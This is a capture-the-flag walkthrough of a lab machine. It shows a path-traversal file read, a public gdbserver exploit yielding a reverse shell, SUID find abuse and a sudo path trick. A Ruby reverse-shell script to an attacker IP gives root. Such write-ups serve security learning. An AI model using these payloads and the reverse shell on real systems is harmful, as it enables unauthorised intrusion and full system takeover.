```bash
[+] Summary written to /home/kali/tools/ctf_tool/results/10.114.138.85/summary.txt


  ════════════════════════════════════════════════════════
  RECON SUMMARY                                           
  ════════════════════════════════════════════════════════

  Target:        10.114.138.85
  DNS:           none
  HTTP:          8000
  HTTPS:         none
  Generated:     2026-05-09 09:40:25

  ────────────────────────────────────────────────────────
  OPEN PORTS & SERVICES
  ────────────────────────────────────────────────────────
  PORT         STATE      SERVICE          VERSION
  ────────────────────────────────────────────────────────
  22/tcp       open       ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
  6048/tcp     open       x11?             
  8000/tcp     open       http             Werkzeug httpd 3.0.2 (Python 3.8.10)

  ────────────────────────────────────────────────────────
  SUBDOMAINS  (0 found)
  ────────────────────────────────────────────────────────
  none

  ────────────────────────────────────────────────────────
  INTERESTING PATHS  (1 found)
  ────────────────────────────────────────────────────────

  [ http://airplane.thm:8000 ]
  STATUS   PATH
  ──────────────────────────────────────────────────
  302      /?page

  ════════════════════════════════════════════════════════

=== Done! Results: /home/kali/tools/ctf_tool/results/10.114.138.85/ ===
```

ok so we got ssh and http and a unknown service. Let's visit the website.

```bash
http://airplane.thm:8000/?page=index.html
```

The url looked like there is a possible LFI and i was correct i was able to download the /etc/passwd file

```bash
 curl http://airplane.thm:8000/?page=../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
fwupd-refresh:x:122:127:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
geoclue:x:123:128::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:124:129:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:126:131:Gnome Display Manager:/var/lib/gdm3:/bin/false
sssd:x:127:132:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
hudson:x:1001:1001::/home/hudson:/bin/bash
sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
```

From this we are also able to see the usernames of carlos and hudson.

Let's enumerate further.

```bash
curl http://airplane.thm:8000/?page=../../../../../../proc/self/environ --output -
LANG=en_US.UTF-8LC_ADDRESS=tr_TR.UTF-8LC_IDENTIFICATION=tr_TR.UTF-8LC_MEASUREMENT=tr_TR.UTF-8LC_MONETARY=tr_TR.UTF-8LC_NAME=tr_TR.UTF-8LC_NUMERIC=tr_TR.UTF-8LC_PAPER=tr_TR.UTF-8LC_TELEPHONE=tr_TR.UTF-8LC_TIME=tr_TR.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/binHOME=/home/hudsonLOGNAME=hudsonUSER=hudsonSHELL=/bin/bashINVOCATION_ID=fe60d5b5995f4ba4b098f76fe83dd19bJOURNAL_STREAM=9:19774 
```

After enumerating the machines tcp connections we can see that the service on port 6048 is gdbserver. Let's see if there are exploits for it.


https://www.exploit-db.com/exploits/50539


```bash
┌──(kali㉿kali)-[~/temp]
└─$ python3 50539.py 10.114.138.85:6048 rev.bin
[+] Connected to target. Preparing exploit
[+] Found x64 arch
[+] Sending payload
[*] Pwned!! Check your listener
                                                                                                                    
┌──(kali㉿kali)-[~/temp]
└─$ 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
┌──(kali㉿kali)-[~/temp]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.206.78] from (UNKNOWN) [10.114.138.85] 36222
id
uid=1001(hudson) gid=1001(hudson) groups=1001(hudson)
```

Ok now we have shell access.

I imported linpeas over

```bash
hudson@airplane:/opt$ find / -perm -4000 -type f 2>/dev/null                                                                         
find / -perm -4000 -type f 2>/dev/null                                                                                               
/usr/bin/find                                                                                                                        
/usr/bin/sudo                                                                                                                        
/usr/bin/pkexec                                                                                                                      
/usr/bin/passwd                                                                                                                      
/usr/bin/chfn                                                                                                                        
/usr/bin/umount                                                                                                                      
/usr/bin/fusermount                                                                                                                 
```

```bash
hudson@airplane:/usr/bin$ ls -la | grep find
ls -la | grep find
-rwsr-xr-x  1 carlos carlos    320160 Feb 18  2020 find
```

Ok the find command has the SUID bit set so we can use it to escalate our priviledges to the user carlos since the script runs as user carlos

```bash
hudson@airplane:/usr/bin$ find . -exec /bin/sh -p \; -quit
find . -exec /bin/sh -p \; -quit
$ id
id
uid=1001(hudson) gid=1001(hudson) euid=1000(carlos) groups=1001(hudson)
```

OK now it's time to see how we can escalate our privileges to root

```bash
carlos@airplane:~$ sudo -l
Matching Defaults entries for carlos on airplane:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

Ok so we are able to execute the ruby files that are located in the root's directory. There is no way we are able to access it so we have to find a  way to trick it.

Ok step 1 we make a our malicious ruby script and place it somewhere. I chose the /tmp

```bash
carlos@airplane:/tmp$ cat /tmp/exploit.rb
#!/usr/bin/env ruby
require 'socket'

ip   = "192.168.206.78"   # your listener IP
port = 4444

s = TCPSocket.new(ip, port)
[STDIN, STDOUT, STDERR].each { |fd| fd.reopen(s) }
exec "/bin/sh"
```

Then we setup a listener and then execute it with a small trick

```bash
carlos@airplane:/tmp$ sudo /usr/bin/ruby /root/../tmp/exploit.rb

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.206.78] from (UNKNOWN) [10.114.138.85] 40878
id
uid=0(root) gid=0(root) groups=0(root)
```


